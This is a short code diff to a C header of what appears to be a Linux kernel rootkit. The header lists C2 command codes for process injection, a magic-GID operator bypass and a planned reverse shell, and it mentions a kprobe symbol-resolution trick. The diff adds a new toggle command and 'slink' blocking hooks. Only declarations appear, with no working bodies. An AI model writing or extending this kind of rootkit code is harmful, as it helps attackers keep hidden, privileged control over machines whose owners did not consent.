@@ -44,6 +44,7 @@
 #define CMD_ADD_GID       5     /* x2 = target PID */
 #define CMD_INJECT        6     /* x2 = target PID */
 #define CMD_REVSHELL      7     /* x2 = port, x3 = IP (not implemented) */
+#define CMD_TOGGLE_SLINK  8
 
 /* ─── Symbol resolution (kprobe trick) ────────────────────────────────────── */
 
@@ -84,6 +85,9 @@ void c2_exit(void);
 int  inject_init(void);
 void inject_exit(void);
 int  inject_trigger(pid_t target);
+
+int slink_block_init(void);
+void slink_block_exit(void);
 
 /* ─── Operator bypass (check for magic gid shared helper) ──────────────────── */
 
